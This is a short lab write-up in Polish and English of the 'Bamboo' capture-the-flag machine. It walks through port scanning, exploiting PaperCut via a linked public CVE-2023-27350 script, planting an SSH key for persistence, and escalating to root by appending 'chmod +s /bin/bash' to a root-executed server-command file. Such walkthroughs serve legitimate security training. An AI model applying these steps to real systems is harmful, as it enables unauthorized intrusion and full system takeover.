# Bamboo
Linux, Medium, created by **xct**

```
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy Squid http proxy 5.2
|_http-server-header: squid/5.2
|_http-title: ERROR: The requested URL could not be retrieved
```

![{0FAE95AF-9A4B-47D1-A586-3F466A4B4E6C}](https://github.com/user-attachments/assets/8293c651-a796-411f-8068-781122bf6581)

30 minutes scan............

![{EB8BB8F2-AE3F-4372-81B4-13E304B4B16B}](https://github.com/user-attachments/assets/21ef7162-d71d-4f33-8710-6b49b3f7d84a)

![{B4004EC8-E293-4BD3-A500-8F5CD6296D5C}](https://github.com/user-attachments/assets/22bff75f-f20d-4249-ad6c-56eacd6c62de)

NA STARCIE 9174 i 9191 wygląda ciekawie

9174
```
<!doctype html><html lang="en"><head><meta charset="utf-8"/><link rel="shortcut icon" href="./favicon.ico"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,shrink-to-fit=no"/><meta name="theme-color" content="#000000"/><link rel="manifest" href="./manifest.json"/><title>Print Deploy Server UI</title><link href="./static/css/main.440745f5.chunk.css" rel="stylesheet"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"></div><script>!function(e){function r(r){for(var n,l,p=r[0],i=r[1],f=r[2],c=0,s=[];c<p.length;c++)l=p[c],Object.prototype.hasOwnProperty.call(o,l)&&o[l]&&s.push(o[l][0]),o[l]=0;for(n in i)Object.prototype.hasOwnProperty.call(i,n)&&(e[n]=i[n]);for(a&&a(r);s.length;)s.shift()();return u.push.apply(u,f||[]),t()}function t(){for(var e,r=0;r<u.length;r++){for(var t=u[r],n=!0,p=1;p<t.length;p++){var i=t[p];0!==o[i]&&(n=!1)}n&&(u.splice(r--,1),e=l(l.s=t[0]))}return e}var n={},o={1:0},u=[];function l(r){if(n[r])return n[r].exports;var t=n[r]={i:r,l:!1,exports:{}};return e[r].call(t.exports,t,t.exports,l),t.l=!0,t.exports}l.m=e,l.c=n,l.d=function(e,r,t){l.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},l.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},l.t=function(e,r){if(1&r&&(e=l(e)),8&r)return e;if(4&r&&"object"==typeof e&&e&&e.__esModule)return e;var t=Object.create(null);if(l.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:e}),2&r&&"string"!=typeof e)for(var n in e)l.d(t,n,function(r){return e[r]}.bind(null,n));return t},l.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return l.d(r,"a",r),r},l.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},l.p="./";var p=this["webpackJsonpprinter-deploy-server"]=this["webpackJsonpprinter-deploy-server"]||[],i=p.push.bind(p);p.push=r,p=p.slice();for(var f=0;f<p.length;f++)r(p[f]);var a=i;t()}([])* Connection #0 to host 127.0.0.1 left intact
</script><script src="./static/js/2.eb0f9725.chunk.js"></script><script src="./static/js/main.001f1a22.chunk.js"></script></body></html>
```

na 9191 wygląda to dużo ciekawej

![{08AD61AC-FB70-4227-B985-FF81B3226EA2}](https://github.com/user-attachments/assets/133f8680-520c-4da4-9938-3067bf904690)

![{8588FE8F-FBBB-4B59-BBA9-946D8EE26509}](https://github.com/user-attachments/assets/b42540d1-d6a6-4871-a1b4-cef7462922a3)

![{EADBB826-5ECB-48D5-8927-F4408E84DFC9}](https://github.com/user-attachments/assets/9537e079-5bf8-4925-9cff-ee83af79b116)

![{40808B9A-58DE-4F62-B4DB-C8CF3206B680}](https://github.com/user-attachments/assets/ce90ebb1-9939-4b01-ad0d-fa1a0f0e8c21)

![{7567C6B8-9CC5-4AC6-AE0E-5EB44A3C4E8D}](https://github.com/user-attachments/assets/2bea1ea8-7720-4e22-a682-52511bd32f68)

![{77E2838C-F136-4C9A-AF48-B50E8C8ACF75}](https://github.com/user-attachments/assets/99f0d560-3ac7-4576-96c6-f09aaa76992f)

I am logged in

![{1B0F7181-8FFA-4241-80A3-84803AAD1875}](https://github.com/user-attachments/assets/bb31315a-33c8-4f01-8011-56f8a1d0ff7c)

so.. try to find some more usfull exploit
https://raw.githubusercontent.com/horizon3ai/CVE-2023-27350/refs/heads/main/CVE-2023-27350.py

![{A8C3CBFE-71BD-43AC-B9D1-E20CBAD46AE1}](https://github.com/user-attachments/assets/d32762ef-8a0c-4cb9-aa16-6471b1604180)

works

![{54C86C97-C30B-4FC6-8003-0F6E7B3C7B17}](https://github.com/user-attachments/assets/85d2fb4c-8ed7-4b98-8783-b44046ce5e15)

some problmes qith rev shelll ech

![{4424678A-B3C2-4DAE-BB00-74EA5B384BEB}](https://github.com/user-attachments/assets/0ff183ea-81d5-4e08-ad0c-876e8f7a2611)

![{FBF2E968-307D-40E5-A12B-93BA2DB432D8}](https://github.com/user-attachments/assets/c93ef51f-4b22-410f-8cbd-efd65267bfb3)

Jesteśmy
![{5197969D-1549-48C2-AF30-DBE105D01592}](https://github.com/user-attachments/assets/0985087a-5c17-4c31-8c4c-d561f06a5fe3)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
11  mkdir .ssh
   12  cd .ssh
   13  ssh-keygen
   14  cat id_rsa
   15  cp id_rsa.pub authorized_keys
```

![{4B2D2000-AE49-4157-ACA4-0D540DA9B64F}](https://github.com/user-attachments/assets/c8978631-2562-4e8b-8755-47749fb8726f)

od razu lepiej

![{36C1F303-CEF5-488D-814A-51C04E13D603}](https://github.com/user-attachments/assets/95cac851-e3a6-4266-bc57-cf46a13f1ff5)

jeden plik należy do roota i ma SUID. Ciekawe

wrzucam na mszynkę https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
- chwilę poczekałem i nic nie widzę :/

![{8CD28F1A-4025-4640-B72D-F2474B785625}](https://github.com/user-attachments/assets/5e43431f-4ca4-491f-b0d5-cef850f5f777)

to wygląda jak coś co lata w pracesach, nie nie wiem czy to usefull

jak lata to spróbuję coś wrzucić
```
echo 'chmod +s /bin/bash' >> server-command
```

- po kilku minutach brak reakcji. Pewnie trzeba ztriggerować

z tego co czytam to jakąś akcję trzeba wykonać na serwerze (9191)

https://www.papercut.com/help/manuals/ng-mf/common/tools-server-command/
https://printing.its.uiowa.edu:9192/content/help/common/topics/tools-server-command.html

żeby było prościej to pivoting przez ssh
```
ssh papercut@10.10.65.147 -i id_rsa -L 9191:127.0.0.1:9191
```

![{3877CE56-BC91-4493-8FAD-0090E36AB07B}](https://github.com/user-attachments/assets/966cd86d-7a6f-492b-b497-bdd1c81dc24d)

Wehn I enter this page I root SUID bash

![{9D2F5291-36AD-4506-ABD8-915E7629D18C}](https://github.com/user-attachments/assets/dee5118c-2b59-4cc1-950e-f5d72d9e3cfb)


